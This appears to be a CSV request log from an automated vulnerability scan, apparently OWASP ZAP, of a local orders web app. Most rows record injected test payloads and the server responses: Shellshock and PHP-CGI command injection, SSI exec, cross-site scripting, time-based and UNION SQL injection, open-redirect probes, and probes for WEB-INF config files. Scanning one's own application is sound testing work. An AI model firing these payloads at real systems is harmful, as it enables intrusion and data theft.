ID,Req. Timestamp,Resp. Timestamp,Method,URL,Code,Reason,RTT,Size Resp. Header,Size Resp. Body
29,Mon Aug 03 21:31:55 EEST 2026,Mon Aug 03 21:31:55 EEST 2026,GET,http://localhost:8080/orders/search?q=http%3A%2F%2Fwww.google.com%3A80%2F,200,OK,4,226,15
30,Mon Aug 03 21:31:55 EEST 2026,Mon Aug 03 21:31:55 EEST 2026,GET,http://localhost:8080/orders/search?q=http%3A%2F%2Fwww.google.com,200,OK,5,226,15
31,Mon Aug 03 21:31:55 EEST 2026,Mon Aug 03 21:31:55 EEST 2026,GET,http://localhost:8080/orders/search?q=http%3A%2F%2Fwww.google.com%2Fsearch%3Fq%3DZAP,200,OK,2,226,93
32,Mon Aug 03 21:31:55 EEST 2026,Mon Aug 03 21:31:55 EEST 2026,GET,http://localhost:8080/orders/search?q=http%3A%2F%2Fwww.google.com%3A80%2Fsearch%3Fq%3DZAP,200,OK,5,226,96
33,Mon Aug 03 21:31:55 EEST 2026,Mon Aug 03 21:31:55 EEST 2026,GET,http://localhost:8080/orders/search?q=www.google.com%2F,200,OK,5,226,15
34,Mon Aug 03 21:31:55 EEST 2026,Mon Aug 03 21:31:55 EEST 2026,GET,http://localhost:8080/orders/search?q=www.google.com%3A80%2F,200,OK,3,226,15
35,Mon Aug 03 21:31:55 EEST 2026,Mon Aug 03 21:31:55 EEST 2026,GET,http://localhost:8080/orders/search?q=www.google.com,200,OK,4,226,15
36,Mon Aug 03 21:31:55 EEST 2026,Mon Aug 03 21:31:55 EEST 2026,GET,http://localhost:8080/orders/search?q=www.google.com%2Fsearch%3Fq%3DZAP,200,OK,4,226,86
37,Mon Aug 03 21:31:55 EEST 2026,Mon Aug 03 21:31:55 EEST 2026,GET,http://localhost:8080/orders/search?q=www.google.com%3A80%2Fsearch%3Fq%3DZAP,200,OK,3,226,89
38,Mon Aug 03 21:31:55 EEST 2026,Mon Aug 03 21:31:55 EEST 2026,GET,http://localhost:8080,200,OK,3,270,128646
39,Mon Aug 03 21:31:55 EEST 2026,Mon Aug 03 21:31:55 EEST 2026,GET,http://localhost:8080,200,OK,3,270,128646
40,Mon Aug 03 21:31:55 EEST 2026,Mon Aug 03 21:31:55 EEST 2026,GET,http://localhost:8080/WEB-INF/web.xml,404,Not Found,6,182,561
41,Mon Aug 03 21:31:55 EEST 2026,Mon Aug 03 21:31:55 EEST 2026,GET,http://localhost:8080/WEB-INF/applicationContext.xml,404,Not Found,2,182,561
42,Mon Aug 03 21:31:55 EEST 2026,Mon Aug 03 21:31:55 EEST 2026,GET,http://localhost:8080/WEB-INF/classes/1/31/1/1.class,404,Not Found,2,182,561
43,Mon Aug 03 21:31:55 EEST 2026,Mon Aug 03 21:31:55 EEST 2026,GET,http://localhost:8080/orders/search?q=%28%29+%7B+%3A%3B%7D%3B+echo+%27x-powered-by%3A+ShellShock-Vulnerable%27,200,OK,5,227,111
44,Mon Aug 03 21:31:55 EEST 2026,Mon Aug 03 21:31:55 EEST 2026,GET,http://localhost:8080/orders/search?q=%28%29+%7B+%3A%3B%7D%3B+%2Fbin%2Fsleep+15,200,OK,3,226,82
45,Mon Aug 03 21:31:55 EEST 2026,Mon Aug 03 21:31:55 EEST 2026,GET,http://localhost:8080,200,OK,2,270,128646
46,Mon Aug 03 21:31:55 EEST 2026,Mon Aug 03 21:31:55 EEST 2026,GET,http://localhost:8080,200,OK,4,270,128646
47,Mon Aug 03 21:31:55 EEST 2026,Mon Aug 03 21:31:55 EEST 2026,GET,http://localhost:8080/config?-s,200,OK,5,227,612
48,Mon Aug 03 21:31:55 EEST 2026,Mon Aug 03 21:31:55 EEST 2026,GET,http://localhost:8080/orders?-s,200,OK,7,227,122
49,Mon Aug 03 21:31:55 EEST 2026,Mon Aug 03 21:31:55 EEST 2026,GET,http://localhost:8080/health?-s,200,OK,11,227,171
50,Mon Aug 03 21:31:55 EEST 2026,Mon Aug 03 21:31:55 EEST 2026,GET,http://localhost:8080/orders/search?-s,200,OK,11,227,123
51,Mon Aug 03 21:31:55 EEST 2026,Mon Aug 03 21:31:55 EEST 2026,GET,http://localhost:8080/?-s,200,OK,2,270,128646
52,Mon Aug 03 21:31:55 EEST 2026,Mon Aug 03 21:31:55 EEST 2026,GET,http://localhost:8080,200,OK,3,270,128646
53,Mon Aug 03 21:31:55 EEST 2026,Mon Aug 03 21:31:55 EEST 2026,POST,http://localhost:8080/?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input,405,Not Allowed,3,184,565
54,Mon Aug 03 21:31:55 EEST 2026,Mon Aug 03 21:31:55 EEST 2026,POST,http://localhost:8080/health?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input,405,METHOD NOT ALLOWED,5,278,153
55,Mon Aug 03 21:31:55 EEST 2026,Mon Aug 03 21:31:55 EEST 2026,POST,http://localhost:8080/?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input,405,Not Allowed,2,184,565
56,Mon Aug 03 21:31:55 EEST 2026,Mon Aug 03 21:31:55 EEST 2026,POST,http://localhost:8080/config?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input,405,METHOD NOT ALLOWED,8,278,153
57,Mon Aug 03 21:31:55 EEST 2026,Mon Aug 03 21:31:55 EEST 2026,POST,http://localhost:8080/orders/search?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input,405,METHOD NOT ALLOWED,11,278,153
58,Mon Aug 03 21:31:55 EEST 2026,Mon Aug 03 21:31:55 EEST 2026,POST,http://localhost:8080/health?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input,405,METHOD NOT ALLOWED,8,278,153
59,Mon Aug 03 21:31:55 EEST 2026,Mon Aug 03 21:31:55 EEST 2026,POST,http://localhost:8080/config?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input,405,METHOD NOT ALLOWED,8,278,153
60,Mon Aug 03 21:31:55 EEST 2026,Mon Aug 03 21:31:55 EEST 2026,POST,http://localhost:8080/orders/search?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input,405,METHOD NOT ALLOWED,6,278,153
61,Mon Aug 03 21:31:55 EEST 2026,Mon Aug 03 21:31:55 EEST 2026,POST,http://localhost:8080/orders?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input,400,BAD REQUEST,24,237,2481
62,Mon Aug 03 21:31:55 EEST 2026,Mon Aug 03 21:31:55 EEST 2026,POST,http://localhost:8080/orders?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input,400,BAD REQUEST,5,237,2481
63,Mon Aug 03 21:31:55 EEST 2026,Mon Aug 03 21:31:55 EEST 2026,GET,http://localhost:8080,200,OK,3,270,128646
64,Mon Aug 03 21:31:55 EEST 2026,Mon Aug 03 21:31:55 EEST 2026,GET,http://localhost:8080/orders/search?q=2973325501628266805.owasp.org,200,OK,4,226,15
65,Mon Aug 03 21:31:55 EEST 2026,Mon Aug 03 21:31:55 EEST 2026,GET,http://localhost:8080/orders/search?q=https%3A%2F%2F2973325501628266805.owasp.org,200,OK,5,226,15
66,Mon Aug 03 21:31:55 EEST 2026,Mon Aug 03 21:31:55 EEST 2026,GET,http://localhost:8080/orders/search?q=https%3A%2F%2F2973325501628266805%252eowasp%252eorg,200,OK,4,226,15
67,Mon Aug 03 21:31:55 EEST 2026,Mon Aug 03 21:31:55 EEST 2026,GET,http://localhost:8080/orders/search?q=5%3BURL%3D%27https%3A%2F%2F2973325501628266805.owasp.org%27,200,OK,4,227,104
68,Mon Aug 03 21:31:55 EEST 2026,Mon Aug 03 21:31:55 EEST 2026,GET,http://localhost:8080/orders/search?q=URL%3D%27http%3A%2F%2F2973325501628266805.owasp.org%27,200,OK,7,227,101
69,Mon Aug 03 21:31:55 EEST 2026,Mon Aug 03 21:31:55 EEST 2026,GET,http://localhost:8080/orders/search?q=https%3A%2F%2F2973325501628266805.owasp.org%2F%3Ftest,200,OK,5,226,15
70,Mon Aug 03 21:31:55 EEST 2026,Mon Aug 03 21:31:55 EEST 2026,GET,http://localhost:8080/orders/search?q=5%3BURL%3D%27https%3A%2F%2F2973325501628266805.owasp.org%2F%3Ftest%27,200,OK,5,227,110
71,Mon Aug 03 21:31:55 EEST 2026,Mon Aug 03 21:31:55 EEST 2026,GET,http://localhost:8080/orders/search?q=https%3A%2F%2F%5C2973325501628266805.owasp.org,200,OK,5,226,15
72,Mon Aug 03 21:31:55 EEST 2026,Mon Aug 03 21:31:55 EEST 2026,GET,http://localhost:8080/orders/search?q=http%3A%2F%2F%5C2973325501628266805.owasp.org,200,OK,5,226,15
73,Mon Aug 03 21:31:55 EEST 2026,Mon Aug 03 21:31:55 EEST 2026,GET,http://localhost:8080,200,OK,10,270,128646
74,Mon Aug 03 21:31:55 EEST 2026,Mon Aug 03 21:31:55 EEST 2026,GET,http://localhost:8080/orders/search?q=%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E,200,OK,3,226,84
75,Mon Aug 03 21:31:55 EEST 2026,Mon Aug 03 21:31:55 EEST 2026,GET,http://localhost:8080/orders/search?q=%22%3E%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E%3C,200,OK,1,226,88
76,Mon Aug 03 21:31:55 EEST 2026,Mon Aug 03 21:31:55 EEST 2026,GET,http://localhost:8080/orders/search?q=%3C%21--%23EXEC+cmd%3D%22dir+%5C%22--%3E,200,OK,3,226,86
77,Mon Aug 03 21:31:55 EEST 2026,Mon Aug 03 21:31:55 EEST 2026,GET,http://localhost:8080/orders/search?q=%22%3E%3C%21--%23EXEC+cmd%3D%22dir+%5C%22--%3E%3C,200,OK,3,226,90
78,Mon Aug 03 21:31:55 EEST 2026,Mon Aug 03 21:31:55 EEST 2026,GET,http://localhost:8080,200,OK,3,270,128646
79,Mon Aug 03 21:31:55 EEST 2026,Mon Aug 03 21:31:55 EEST 2026,GET,http://localhost:8080/orders/search?q=0W45pz4p,200,OK,4,226,15
80,Mon Aug 03 21:31:55 EEST 2026,Mon Aug 03 21:31:55 EEST 2026,GET,http://localhost:8080/orders/search?q=test0W45pz4p,200,OK,2,226,15
81,Mon Aug 03 21:31:55 EEST 2026,Mon Aug 03 21:31:55 EEST 2026,GET,http://localhost:8080/orders/search?q=%27%22%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E,200,OK,4,226,88
82,Mon Aug 03 21:31:55 EEST 2026,Mon Aug 03 21:31:55 EEST 2026,GET,http://localhost:8080/orders/search?q=%27%22%00%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E,200,OK,4,226,94
83,Mon Aug 03 21:31:55 EEST 2026,Mon Aug 03 21:31:55 EEST 2026,GET,http://localhost:8080/orders/search?q=%27%22%3Cimg+src%3Dx+onerror%3Dprompt%28%29%3E,200,OK,3,226,90
84,Mon Aug 03 21:31:55 EEST 2026,Mon Aug 03 21:31:55 EEST 2026,GET,http://localhost:8080,200,OK,3,270,128646
85,Mon Aug 03 21:31:55 EEST 2026,Mon Aug 03 21:31:55 EEST 2026,GET,http://localhost:8080/orders/search?q=zApPX0sS,200,OK,4,226,15
86,Mon Aug 03 21:31:55 EEST 2026,Mon Aug 03 21:31:55 EEST 2026,GET,http://localhost:8080,200,OK,2,270,128646
87,Mon Aug 03 21:31:55 EEST 2026,Mon Aug 03 21:31:55 EEST 2026,GET,http://localhost:8080,200,OK,5,270,128646
88,Mon Aug 03 21:31:55 EEST 2026,Mon Aug 03 21:31:55 EEST 2026,GET,http://localhost:8080/orders,200,OK,6,227,122
89,Mon Aug 03 21:31:55 EEST 2026,Mon Aug 03 21:31:55 EEST 2026,GET,http://localhost:8080/config,200,OK,6,227,612
90,Mon Aug 03 21:31:55 EEST 2026,Mon Aug 03 21:31:55 EEST 2026,GET,http://localhost:8080/orders/search?q=test,200,OK,10,226,15
91,Mon Aug 03 21:31:55 EEST 2026,Mon Aug 03 21:31:55 EEST 2026,GET,http://localhost:8080/health,200,OK,10,227,171
92,Mon Aug 03 21:31:55 EEST 2026,Mon Aug 03 21:31:55 EEST 2026,GET,http://localhost:8080,200,OK,2,270,128646
93,Mon Aug 03 21:31:55 EEST 2026,Mon Aug 03 21:31:55 EEST 2026,GET,http://localhost:8080,200,OK,3,270,128646
94,Mon Aug 03 21:31:55 EEST 2026,Mon Aug 03 21:31:55 EEST 2026,GET,http://localhost:8080/orders/search?q=%27,200,OK,3,226,60
95,Mon Aug 03 21:31:55 EEST 2026,Mon Aug 03 21:31:55 EEST 2026,GET,http://localhost:8080/orders/search?q=test%27,200,OK,2,226,64
96,Mon Aug 03 21:31:55 EEST 2026,Mon Aug 03 21:31:55 EEST 2026,GET,http://localhost:8080/orders/search?q=%22,200,OK,3,226,15
97,Mon Aug 03 21:31:55 EEST 2026,Mon Aug 03 21:31:55 EEST 2026,GET,http://localhost:8080/orders/search?q=test%22,200,OK,2,226,15
98,Mon Aug 03 21:31:55 EEST 2026,Mon Aug 03 21:31:55 EEST 2026,GET,http://localhost:8080/orders/search?q=%3B,200,OK,4,226,60
99,Mon Aug 03 21:31:55 EEST 2026,Mon Aug 03 21:31:55 EEST 2026,GET,http://localhost:8080/orders/search?q=test%3B,200,OK,2,226,64
100,Mon Aug 03 21:31:55 EEST 2026,Mon Aug 03 21:31:55 EEST 2026,GET,http://localhost:8080/orders/search?q=%27%28,200,OK,3,226,61
101,Mon Aug 03 21:31:55 EEST 2026,Mon Aug 03 21:31:55 EEST 2026,GET,http://localhost:8080/orders/search?q=test%27%28,200,OK,3,226,65
102,Mon Aug 03 21:31:55 EEST 2026,Mon Aug 03 21:31:55 EEST 2026,GET,http://localhost:8080/orders/search?q=test,200,OK,3,226,15
103,Mon Aug 03 21:31:55 EEST 2026,Mon Aug 03 21:31:55 EEST 2026,GET,http://localhost:8080/orders/search?q=test,200,OK,2,226,15
104,Mon Aug 03 21:31:55 EEST 2026,Mon Aug 03 21:31:55 EEST 2026,GET,http://localhost:8080/orders/search?q=test+AND+1%3D1+--+,200,OK,2,226,75
105,Mon Aug 03 21:31:55 EEST 2026,Mon Aug 03 21:31:55 EEST 2026,GET,http://localhost:8080/orders/search?q=test%27+AND+%271%27%3D%271%27+--+,200,OK,4,226,80
106,Mon Aug 03 21:31:55 EEST 2026,Mon Aug 03 21:31:55 EEST 2026,GET,http://localhost:8080/orders/search?q=test%22+AND+%221%22%3D%221%22+--+,200,OK,2,226,85
107,Mon Aug 03 21:31:55 EEST 2026,Mon Aug 03 21:31:55 EEST 2026,GET,http://localhost:8080/orders/search?q=test+AND+1%3D1,200,OK,2,226,71
108,Mon Aug 03 21:31:55 EEST 2026,Mon Aug 03 21:31:55 EEST 2026,GET,http://localhost:8080/orders/search?q=test%27+AND+%271%27%3D%271,200,OK,1,226,75
109,Mon Aug 03 21:31:55 EEST 2026,Mon Aug 03 21:31:55 EEST 2026,GET,http://localhost:8080/orders/search?q=test%22+AND+%221%22%3D%221,200,OK,2,226,79
110,Mon Aug 03 21:31:55 EEST 2026,Mon Aug 03 21:31:55 EEST 2026,GET,http://localhost:8080/orders/search?q=test+UNION+ALL+select+NULL+--+,200,OK,2,226,89
111,Mon Aug 03 21:31:55 EEST 2026,Mon Aug 03 21:31:55 EEST 2026,GET,http://localhost:8080/orders/search?q=test%27+UNION+ALL+select+NULL+--+,200,OK,3,226,90
112,Mon Aug 03 21:31:55 EEST 2026,Mon Aug 03 21:31:55 EEST 2026,GET,http://localhost:8080/orders/search?q=test%22+UNION+ALL+select+NULL+--+,200,OK,3,226,91
113,Mon Aug 03 21:31:55 EEST 2026,Mon Aug 03 21:31:55 EEST 2026,GET,http://localhost:8080/orders/search?q=test%29+UNION+ALL+select+NULL+--+,200,OK,2,226,90
114,Mon Aug 03 21:31:55 EEST 2026,Mon Aug 03 21:31:55 EEST 2026,GET,http://localhost:8080/orders/search?q=test%27%29+UNION+ALL+select+NULL+--+,200,OK,3,226,91
115,Mon Aug 03 21:31:55 EEST 2026,Mon Aug 03 21:31:55 EEST 2026,GET,http://localhost:8080/orders/search?q=test,200,OK,3,226,15
116,Mon Aug 03 21:31:55 EEST 2026,Mon Aug 03 21:31:55 EEST 2026,GET,http://localhost:8080,200,OK,2,270,128646
117,Mon Aug 03 21:31:55 EEST 2026,Mon Aug 03 21:31:55 EEST 2026,GET,http://localhost:8080/orders/search?q=test+%2F+sleep%2815%29+,200,OK,3,226,15
118,Mon Aug 03 21:31:55 EEST 2026,Mon Aug 03 21:31:55 EEST 2026,GET,http://localhost:8080/orders/search?q=test%27+%2F+sleep%2815%29+%2F+%27,200,OK,4,226,80
119,Mon Aug 03 21:31:55 EEST 2026,Mon Aug 03 21:31:55 EEST 2026,GET,http://localhost:8080/orders/search?q=test%22+%2F+sleep%2815%29+%2F+%22,200,OK,2,226,15
120,Mon Aug 03 21:31:55 EEST 2026,Mon Aug 03 21:31:55 EEST 2026,GET,http://localhost:8080/orders/search?q=test+and+0+in+%28select+sleep%2815%29+%29+--+,200,OK,2,226,96
121,Mon Aug 03 21:31:55 EEST 2026,Mon Aug 03 21:31:55 EEST 2026,GET,http://localhost:8080/orders/search?q=test%27+and+0+in+%28select+sleep%2815%29+%29+--+,200,OK,3,226,97
122,Mon Aug 03 21:31:55 EEST 2026,Mon Aug 03 21:31:55 EEST 2026,GET,http://localhost:8080/orders/search?q=test%22+and+0+in+%28select+sleep%2815%29+%29+--+,200,OK,3,226,98
123,Mon Aug 03 21:31:55 EEST 2026,Mon Aug 03 21:31:55 EEST 2026,GET,http://localhost:8080/orders/search?q=test+where+0+in+%28select+sleep%2815%29+%29+--+,200,OK,3,226,98
124,Mon Aug 03 21:31:55 EEST 2026,Mon Aug 03 21:31:55 EEST 2026,GET,http://localhost:8080/orders/search?q=test%27+where+0+in+%28select+sleep%2815%29+%29+--+,200,OK,1,226,99
125,Mon Aug 03 21:31:55 EEST 2026,Mon Aug 03 21:31:55 EEST 2026,GET,http://localhost:8080/orders/search?q=test%22+where+0+in+%28select+sleep%2815%29+%29+--+,200,OK,3,227,100
126,Mon Aug 03 21:31:55 EEST 2026,Mon Aug 03 21:31:55 EEST 2026,GET,http://localhost:8080/orders/search?q=test+or+0+in+%28select+sleep%2815%29+%29+--+,200,OK,0,226,95
127,Mon Aug 03 21:31:55 EEST 2026,Mon Aug 03 21:31:55 EEST 2026,GET,http://localhost:8080,200,OK,1,270,128646
128,Mon Aug 03 21:31:55 EEST 2026,Mon Aug 03 21:31:55 EEST 2026,GET,http://localhost:8080/orders/search?q=%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+,200,OK,2,227,211
129,Mon Aug 03 21:31:55 EEST 2026,Mon Aug 03 21:31:55 EEST 2026,GET,http://localhost:8080/orders/search?q=%27%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+,200,OK,5,227,212
130,Mon Aug 03 21:31:55 EEST 2026,Mon Aug 03 21:31:55 EEST 2026,GET,http://localhost:8080/orders/search?q=%22%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+,200,OK,3,227,213
131,Mon Aug 03 21:31:55 EEST 2026,Mon Aug 03 21:31:55 EEST 2026,GET,http://localhost:8080/orders/search?q=%29%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+,200,OK,2,227,212
132,Mon Aug 03 21:31:55 EEST 2026,Mon Aug 03 21:31:55 EEST 2026,GET,http://localhost:8080/orders/search?q=%22java.lang.Thread.sleep%22%2815000%29,200,OK,3,226,15
133,Mon Aug 03 21:31:55 EEST 2026,Mon Aug 03 21:31:55 EEST 2026,GET,http://localhost:8080/orders/search?q=test+%2F+%22java.lang.Thread.sleep%22%2815000%29+,200,OK,2,226,15
134,Mon Aug 03 21:31:55 EEST 2026,Mon Aug 03 21:31:55 EEST 2026,GET,http://localhost:8080/orders/search?q=test%27+%2F+%22java.lang.Thread.sleep%22%2815000%29+%2F+%27,200,OK,2,227,104
135,Mon Aug 03 21:31:55 EEST 2026,Mon Aug 03 21:31:55 EEST 2026,GET,http://localhost:8080/orders/search?q=test%22+%2F+%22java.lang.Thread.sleep%22%2815000%29+%2F+%22,200,OK,3,226,15
136,Mon Aug 03 21:31:55 EEST 2026,Mon Aug 03 21:31:55 EEST 2026,GET,http://localhost:8080/orders/search?q=test+and+exists+%28+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27%29+--+,200,OK,3,227,228
137,Mon Aug 03 21:31:55 EEST 2026,Mon Aug 03 21:31:55 EEST 2026,GET,http://localhost:8080/orders/search?q=test%27+and+exists+%28+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27%29+--+,200,OK,3,227,229
138,Mon Aug 03 21:31:55 EEST 2026,Mon Aug 03 21:31:55 EEST 2026,GET,http://localhost:8080,200,OK,1,270,128646
139,Mon Aug 03 21:31:55 EEST 2026,Mon Aug 03 21:31:55 EEST 2026,GET,http://localhost:8080/orders/search?q=%28DBMS_SESSION.SLEEP%2815%29%29,200,OK,2,226,15
140,Mon Aug 03 21:31:55 EEST 2026,Mon Aug 03 21:31:55 EEST 2026,GET,http://localhost:8080/orders/search?q=test+%2F+%28DBMS_SESSION.SLEEP%2815%29%29+,200,OK,2,226,15
141,Mon Aug 03 21:31:55 EEST 2026,Mon Aug 03 21:31:55 EEST 2026,GET,http://localhost:8080/orders/search?q=test%27+%2F+%28DBMS_SESSION.SLEEP%2815%29%29+%2F+%27,200,OK,3,226,95
142,Mon Aug 03 21:31:55 EEST 2026,Mon Aug 03 21:31:55 EEST 2026,GET,http://localhost:8080/orders/search?q=test%22+%2F+%28DBMS_SESSION.SLEEP%2815%29%29+%2F+%22,200,OK,3,226,15
143,Mon Aug 03 21:31:55 EEST 2026,Mon Aug 03 21:31:55 EEST 2026,GET,http://localhost:8080/orders/search?q=test+and+exists+%28DBMS_SESSION.SLEEP%2815%29%29+--+,200,OK,3,227,103
144,Mon Aug 03 21:31:55 EEST 2026,Mon Aug 03 21:31:55 EEST 2026,GET,http://localhost:8080,200,OK,2,270,128646
145,Mon Aug 03 21:31:55 EEST 2026,Mon Aug 03 21:31:55 EEST 2026,GET,http://localhost:8080/orders/search?q=case+when+cast%28pg_sleep%2815.0%29+as+varchar%29+%3E+%27%27+then+0+else+1+end,200,OK,3,227,123
146,Mon Aug 03 21:31:55 EEST 2026,Mon Aug 03 21:31:55 EEST 2026,GET,http://localhost:8080/orders/search?q=case+when+cast%28pg_sleep%2815.0%29+as+varchar%29+%3E+%27%27+then+0+else+1+end+--+,200,OK,2,227,127
